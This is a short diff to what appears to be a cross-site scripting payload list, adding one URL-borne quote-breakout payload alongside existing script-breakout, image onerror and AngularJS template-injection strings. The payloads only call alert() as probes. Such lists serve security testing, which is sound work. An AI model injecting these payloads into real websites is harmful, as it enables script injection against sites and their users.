@@ -128,6 +128,7 @@ ${alert(1)}
 \"-alert(1)}//
 </script><img src=1 onerror=alert(document.domain)>
 \';alert(1)//
+http://xxxxx.com?&apos;-alert(414)-&apos;
 
 //angular
 {{$on.constructor('alert(1)')()}}
